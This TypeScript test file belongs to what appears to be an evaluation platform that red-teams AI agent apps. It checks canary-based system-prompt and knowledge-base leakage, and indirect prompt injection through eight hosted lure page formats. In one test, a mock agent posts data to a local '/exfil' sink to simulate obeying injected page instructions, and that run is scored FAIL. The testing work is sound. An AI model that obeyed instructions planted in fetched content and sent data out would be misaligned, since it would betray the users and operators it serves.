import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import Fastify from 'fastify';
import { buildApp } from '../src/app.js';
import { prisma } from '../src/db.js';
import { endpointSinkRoutes } from '../src/modules/endpoint-evals/sink-routes.js';
import { runPlatformScenario } from '../src/modules/agent-evals/observed-runner.js';
import { generatePlatformAppV2Scenarios, PLATFORM_V2_TEMPLATES } from '../src/modules/agent-evals/packs/platform-app-v2.js';
import { V2_PAGE_CHANNELS } from '../src/modules/agent-evals/platform-sink.js';

const prefix = '__platform_v2_route_';
const KB = 'LSE-CANARY-KB-route0001';
const SYS = 'LSE-CANARY-SYS-route0001';
const BASE = 'http://127.0.0.1:9/v1';
let app: Awaited<ReturnType<typeof buildApp>>;
let token = '';
let targetId = '';
const prev = process.env.LSE_PLATFORM_APP_ENABLED;

async function cleanup() {
  await prisma.evalTask.deleteMany({ where: { name: { startsWith: prefix } } });
  await prisma.questionSet.deleteMany({ where: { name: { startsWith: prefix } } });
  await prisma.modelTarget.deleteMany({ where: { name: { startsWith: prefix } } });
}
before(async () => {
  process.env.LSE_PLATFORM_APP_ENABLED = 'true';
  await cleanup();
  targetId = (await prisma.modelTarget.create({ data: { name: `${prefix}目标`, targetType: 'PLATFORM_APP', provider: 'dify', baseUrl: BASE, apiKey: 'app-local-secret', model: 'platform-app',
    accessConfig: { platform: 'dify', baseUrl: BASE, appMode: 'agent-chat', knowledgeCanary: KB, systemCanary: SYS } } })).id;
  app = await buildApp();
  const login = await app.inject({ method: 'POST', url: '/api/auth/login', payload: { username: 'admin', password: 'Admin@12345' } });
  assert.equal(login.statusCode, 200, login.body);
  token = login.json().token;
});
after(async () => {
  await cleanup();
  await app.close();
  await prisma.$disconnect();
  if (prev === undefined) delete process.env.LSE_PLATFORM_APP_ENABLED; else process.env.LSE_PLATFORM_APP_ENABLED = prev;
});

const headers = () => ({ authorization: `Bearer ${token}` });
async function questionsOf(taskId: string) {
  const task = await prisma.evalTask.findUniqueOrThrow({ where: { id: taskId }, include: { questionSets: { include: { questionSet: { include: { questions: true } } } } } });
  return task.questionSets.flatMap(s => s.questionSet.questions);
}
const run = (payload: object) => app.inject({ method: 'POST', url: '/api/agent-evals/run', headers: headers(), payload: { modelTargetId: targetId, adaptiveOverride: { enabled: false }, ...payload } });

test('run：请求没给 packIds 或给 v1，平台对象仍用 v1，行为不变', async () => {
  for (const payload of [{ sampleCount: 5, seed: 'r1' }, { sampleCount: 5, seed: 'r2', packIds: ['platform-app-v1'] }]) {
    const res = await run(payload);
    assert.equal(res.statusCode, 201, res.body);
    assert.deepEqual(res.json().packIds, ['platform-app-v1']);
    assert.equal(res.json().attackPackVersion, 'platform-app-v1');
    const questions = await questionsOf(res.json().taskId);
    assert.equal(questions.length, 5);
    assert.ok(questions.every(q => (q.metadata as any).attackPackId === 'platform-app-v1'));
  }
});

test('run：请求明确给出 platform-app-v2 才用 v2，并用评估对象配置补齐暗号', async () => {
  const res = await run({ sampleCount: 12, seed: 'r3', packIds: ['platform-app-v2'] });
  assert.equal(res.statusCode, 201, res.body);
  assert.deepEqual(res.json().packIds, ['platform-app-v2']);
  assert.equal(res.json().attackPackVersion, 'platform-app-v2');
  assert.equal(res.json().sampleCount, 12);
  const questions = await questionsOf(res.json().taskId);
  assert.ok(questions.every(q => (q.metadata as any).attackPackId === 'platform-app-v2'));
  assert.deepEqual([...new Set(questions.map(q => (q.metadata as any).templateId))].sort(), PLATFORM_V2_TEMPLATES.map(t => t.id).sort());
  const kb = questions.filter(q => (q.metadata as any).templateId === 'knowledge_access');
  assert.ok(kb.length > 0 && kb.every(q => (q.metadata as any).safeCanary === KB));
  const sys = questions.filter(q => (q.metadata as any).templateId === 'orchestration_leakage');
  assert.ok(sys.every(q => (q.metadata as any).safeCanary === SYS));
  // v1 与 v2 同时给出时，以明确给出的 v2 为准。
  const both = await run({ sampleCount: 6, seed: 'r4', packIds: ['platform-app-v1', 'platform-app-v2'] });
  assert.equal(both.statusCode, 201, both.body);
  assert.deepEqual(both.json().packIds, ['platform-app-v2']);
});

test('run：sampleCount 乘以模板数达到变体数时，每个变体都被用到', async () => {
  const res = await run({ sampleCount: 56, seed: 'r5', packIds: ['platform-app-v2'] });
  assert.equal(res.statusCode, 201, res.body);
  const questions = await questionsOf(res.json().taskId);
  for (const template of PLATFORM_V2_TEMPLATES) {
    const used = new Set(questions.filter(q => (q.metadata as any).templateId === template.id).map(q => (q.metadata as any).variantId));
    assert.equal(used.size, template.variants.length, `${template.id} 应覆盖全部 ${template.variants.length} 个变体`);
  }
});

test('preview 与 /packs：v2 可选，v1 条目不变，开关关闭时拒绝', async () => {
  const preview = await app.inject({ method: 'POST', url: '/api/agent-evals/preview', headers: headers(), payload: { modelTargetId: targetId, packIds: ['platform-app-v2'], sampleCount: 12, seed: 'p1' } });
  assert.equal(preview.statusCode, 200, preview.body);
  assert.equal(preview.json().sampleCount, 12);
  assert.ok(preview.json().samples.every((s: any) => s.metadata.attackPackId === 'platform-app-v2'));
  const packs = await app.inject({ method: 'GET', url: '/api/agent-evals/packs', headers: headers() });
  const items = packs.json().items as { id: string; templateCount: number }[];
  assert.equal(items.find(i => i.id === 'platform-app-v1')?.templateCount, 5);
  assert.equal(items.find(i => i.id === 'platform-app-v2')?.templateCount, 7);
  process.env.LSE_PLATFORM_APP_ENABLED = 'false';
  try {
    const hidden = await app.inject({ method: 'GET', url: '/api/agent-evals/packs', headers: headers() });
    assert.ok(hidden.json().items.every((i: { id: string }) => !i.id.startsWith('platform-app-')));
    const off = await app.inject({ method: 'POST', url: '/api/agent-evals/preview', headers: headers(), payload: { packIds: ['platform-app-v2'], sampleCount: 6 } });
    assert.equal(off.statusCode, 403, off.body);
    assert.equal((await run({ packIds: ['platform-app-v2'], sampleCount: 6 })).statusCode, 403);
  } finally { process.env.LSE_PLATFORM_APP_ENABLED = 'true'; }
});

for (const exfil of [false, true]) test(`真实接收端：v2 的 8 种页面形态逐一托管并抓取${exfil ? '，页面指令被照做后外发判 FAIL' : '，只抓取不照做判 PASS'}`, async () => {
  const previous = { enabled: process.env.LSE_PLATFORM_APP_ENABLED, base: process.env.LSE_PUBLIC_BASE_URL, endpoint: process.env.LSE_ENDPOINT_EVAL_ENABLED };
  process.env.LSE_PLATFORM_APP_ENABLED = 'true';
  process.env.LSE_ENDPOINT_EVAL_ENABLED = 'false';
  const sink = Fastify();
  await sink.register(endpointSinkRoutes, { prefix: '/sink' });
  await sink.listen({ port: 0, host: '127.0.0.1' });
  const publicBase = `http://127.0.0.1:${(sink.server.address() as AddressInfo).port}`;
  process.env.LSE_PUBLIC_BASE_URL = publicBase;
  let fetched: { url: string; status: number; type: string; body: string } | null = null;
  const platform = createServer(async (req, res) => {
    try {
      const chunks = []; for await (const chunk of req) chunks.push(chunk);
      const query = String(JSON.parse(Buffer.concat(chunks).toString()).query);
      const url = query.match(/http:\/\/[^\s]+/)![0];
      const page = await fetch(url);
      fetched = { url, status: page.status, type: page.headers.get('content-type') ?? '', body: await page.text() };
      if (exfil) await fetch(`${publicBase}/sink/${new URL(url).pathname.split('/')[2]}/exfil`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ data: 'x' }) });
      res.end('data: {"event":"message","answer":"这是一份发布说明。"}\n\ndata: {"event":"message_end","conversation_id":"v2-sink-conv"}\n\n');
    } catch { res.statusCode = 500; res.end(); }
  });
  await new Promise<void>(r => platform.listen(0, '127.0.0.1', r));
  const baseUrl = `http://127.0.0.1:${(platform.address() as AddressInfo).port}/v1`;
  const target = await prisma.modelTarget.create({ data: { name: `${prefix}接收端${exfil ? '外发' : '只读'}`, targetType: 'PLATFORM_APP', provider: 'dify', baseUrl, apiKey: 'app-test', model: 'platform-app', accessConfig: { platform: 'dify', baseUrl } } });
  const task = await prisma.evalTask.create({ data: { name: `${prefix}接收端任务${exfil ? '外发' : '只读'}`, modelTargetId: target.id, status: 'RUNNING', engines: ['agent-tool-guard'], dimensions: [], concurrency: 1 } });
  try {
    const scenarios = generatePlatformAppV2Scenarios('sink-seed', 40, ['indirect_url'], {});
    assert.equal(scenarios.length, 40);
    const seen = new Set<string>();
    for (const scenario of scenarios.slice(0, 8)) {
      fetched = null;
      const channel = String((scenario.metadata as any).pageChannel);
      const result = await runPlatformScenario({ ...target, accessConfig: { platform: 'dify', baseUrl } }, { prompt: scenario.prompt, metadata: scenario.metadata }, { taskId: task.id });
      assert.ok(fetched, `${channel} 页面应被抓取`);
      const page = fetched as unknown as { url: string; status: number; type: string; body: string };
      assert.equal(page.status, 200, channel);
      assert.ok(page.url.endsWith(`/${channel}`), `${channel} 地址按形态替换：${page.url}`);
      assert.ok(page.body.includes('发布说明'), channel);
      assert.ok(page.body.includes('完成对账') || channel === 'v2_zero_width', channel);
      const hitKinds = ((result.raw as any).sinkHits as { kind: string; channel?: string }[]).map(h => h.kind).sort();
      assert.deepEqual(hitKinds, exfil ? ['exfil', 'fetch'] : ['fetch'], channel);
      assert.equal(result.verdict, exfil ? 'FAIL' : 'PASS', channel);
      assert.equal((result.raw as any).lureRead, true, channel);
      seen.add(channel);
    }
    assert.deepEqual([...seen].sort(), [...V2_PAGE_CHANNELS].sort(), '8 种页面形态各被验证一次');
  } finally {
    await prisma.evalTask.delete({ where: { id: task.id } });
    await prisma.modelTarget.delete({ where: { id: target.id } });
    await sink.close();
    await new Promise<void>(r => platform.close(() => r()));
    for (const [key, value] of Object.entries({ LSE_PLATFORM_APP_ENABLED: previous.enabled, LSE_PUBLIC_BASE_URL: previous.base, LSE_ENDPOINT_EVAL_ENABLED: previous.endpoint })) {
      if (value === undefined) delete process.env[key]; else process.env[key] = value;
    }
  }
});
